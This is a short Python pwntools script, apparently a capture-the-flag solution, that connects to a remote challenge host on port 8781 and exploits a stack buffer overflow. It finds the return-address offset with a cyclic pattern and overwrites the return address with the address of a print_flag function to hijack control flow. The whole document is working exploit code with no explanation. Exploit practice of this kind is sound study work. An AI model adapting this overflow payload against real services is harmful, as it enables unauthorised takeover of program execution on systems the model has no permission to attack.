from pwnlib.util.cyclic import cyclic, cyclic_find
from pwn import *

# p = process("./source_fixed")
p = remote("chall.codefest.tech", 8781)

input("attach gdb")

print_flag = 0x4011b6

print(p.recv())

index = cyclic_find('kaaa')

payload = cyclic()[:index]

payload += p64(print_flag)

print(payload)

p.sendline(payload)

p.interactive()